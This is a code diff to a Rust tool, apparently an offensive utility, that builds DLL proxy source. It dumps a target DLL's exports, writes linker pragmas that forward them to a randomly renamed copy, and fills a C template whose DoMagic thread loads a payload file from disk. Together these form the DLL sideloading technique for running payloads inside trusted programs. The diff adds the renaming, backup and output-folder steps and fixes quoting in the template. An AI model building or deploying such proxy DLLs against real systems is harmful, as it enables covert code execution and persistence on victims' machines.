@@ -12,10 +12,12 @@ use colored::Colorize;
 use handlebars::{no_escape, Handlebars};
 use serde_json::json;
 use indoc::indoc;
+use std::fs;
 use std::process;
 use std::io::{self, Write};
 use std::path::Path;
 use pelite::{FileMap, Wrap, PeFile};
+use rand::distributions::{Alphanumeric, DistString};
 
 
 #[derive(Parser)]
@@ -39,6 +41,7 @@ fn main() {
 	let cli = Cli::parse();
 	let dll_loc = cli.dll;
 	let payload_loc = cli.payload;
+    let tmp_name = format!("{}{}", "tmp", (Alphanumeric.sample_string(&mut rand::thread_rng(), 4)));
     let dll_template = get_dll_template();
     let mut tmp_format = Handlebars::new();
     // tell the handlebars to not escaping string
@@ -51,7 +54,19 @@ fn main() {
 			process::exit(1);
 		}
 
-        let dll_name = Path::new(&dll_loc).file_stem().unwrap().to_string_lossy();
+        let file_noext = Path::new(&dll_loc).file_stem().unwrap().to_string_lossy();
+        let file_name = Path::new(&dll_loc).file_name().unwrap().to_string_lossy();
+        let in_dir = format!("input_{}", &file_noext);
+        let out_dir = format!("output_{}", &file_noext);
+
+        println!("{}{}", "[+] Creating input folder if not exist ", &in_dir.yellow());
+        create_io_dir(&in_dir);
+        println!("{}{}", "[+] Backup original DLL to input directory at ", &in_dir.yellow());
+        copy_file(&dll_loc, &format!("{}/{}", &in_dir, &file_name));
+
+        println!("{}{}", "[+] Creating output folder if not exist ", &out_dir.yellow());
+
+        create_io_dir(&out_dir);
 
 		// Load the desired file into memory
 		let file_map = FileMap::open(&dll_loc).unwrap();
@@ -59,19 +74,24 @@ fn main() {
 		println!("{}{}", "[+] Searching exports function from : ", &dll_loc.yellow());
 
 		// Process the image file
-        let mut exports = Vec::new();
+        let mut _exports = Vec::new();
+
         let mut pragma: Vec<String> = Vec::new();
 		match PeFile::from_bytes(&file_map) {
-			Ok(Wrap::T32(file)) => exports = dump_export32(file),
-			Ok(Wrap::T64(file)) => exports = dump_export64(file),
+			Ok(Wrap::T32(file)) => _exports = dump_export32(file),
+			Ok(Wrap::T64(file)) => _exports = dump_export64(file),
 			Err(err) => abort(&format!("{}", err)),
 		}
-        for i in &exports {
-            pragma.push(format!("#pragma comment(linker, \"/export:{}={}.{}\")\n", i, dll_name, i ));
+        let export_count = _exports.len();
+        println!("[+] Redirecting {} function calls from {} to {}.dll", &export_count, file_name, tmp_name);
+        for i in &_exports {
+            pragma.push(format!("#pragma comment(linker, \"/export:{}={}.{}\")\n", i, tmp_name, i ));
         }
 
         let pragma_builders = pragma.join("");
         let templ = tmp_format.render_template(&dll_template, &json!({"PRAGMA": &pragma_builders, "PAYLOAD_PATH": payload_loc})).unwrap();
+        let c_file = format!("{}/{}_pragma.c", &out_dir, &file_noext);
+        println!("{}{}", "[+] Exporting DLL C source code to ", &c_file );
 
 
 	}else{
@@ -130,9 +150,23 @@ fn check_file_exist(path: &str) -> bool {
 	return Path::new(path).exists();
 }
 
+fn create_io_dir(dirname: &String){
+    match fs::create_dir_all(dirname){
+        Err(e) => println!("{:?}", e),
+        _ => ()
+    }
+}
+
+fn copy_file(from: &String, to: &String){
+    match fs::copy(from, to){
+        Err(e) => println!("{:?}", e),
+        _ => ()
+    }
+}
+
 fn get_dll_template() -> String{
     let template =  indoc! { r###"
-#include ""pch.h""
+#include "pch.h"
 #include <stdio.h>
 #include <stdlib.h>
 #define _CRT_SECURE_NO_DEPRECATE
@@ -144,7 +178,7 @@ DWORD WINAPI DoMagic(LPVOID lpParameter)
 FILE* fp;
     size_t size;
     unsigned char* buffer;
-    fp = fopen(""{{PAYLOAD_PATH}}"", ""rb"");
+    fp = fopen("{{PAYLOAD_PATH}}", "rb");
     fseek(fp, 0, SEEK_END);
     size = ftell(fp);
     fseek(fp, 0, SEEK_SET);
